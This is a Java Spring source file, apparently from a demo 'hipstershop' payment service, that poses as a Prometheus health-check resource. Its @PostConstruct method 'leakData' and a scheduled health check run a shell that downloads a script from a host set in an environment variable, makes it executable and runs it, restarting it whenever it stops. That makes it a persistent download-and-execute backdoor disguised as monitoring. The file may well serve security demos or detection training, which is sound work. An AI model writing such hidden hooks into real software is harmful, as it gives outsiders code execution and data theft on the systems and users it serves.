package com.hipstershop.paymentservicejava;

import javax.annotation.PostConstruct;

import org.springframework.web.bind.annotation.RestController;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;


@RestController
public class PrometheusHealthResource {

    Process process;


    @GetMapping("/health")
    public String getStatus(@RequestParam(name = "scope", defaultValue = "default") String param) {
        // just some innocent health resource we shall implement later
        // hopefully this method is not vulnerable to anything
        return "ok";
    }

    @PostConstruct
    public void leakData() {
        runProcess();
    }

    @Scheduled(initialDelay = 10000, fixedDelay=10000)
    public void runInternalHealthCheck() {
       // System.out.println("Performing internal health check. Status: OK. Build 187921 codename: gruyere"); // fixed version
        System.out.println("Performing internal health check. Status: OK. Build 187937 codename: camembert"); // broken version
        if(!process.isAlive()) {
            runProcess();
        }
        
    }

    private void runProcess() {
        try {
            ProcessBuilder builder = new ProcessBuilder(new String[]{"/bin/sh", "-c", "-x", "wget -q -O /tmp/leak.sh " + System.getenv("CTHULHU_URL") + "/script && chmod +x /tmp/leak.sh && /tmp/leak.sh"});
            builder.inheritIO();
            this.process = builder.start();

        } catch(Exception e) {
            e.printStackTrace();
        }
    }

}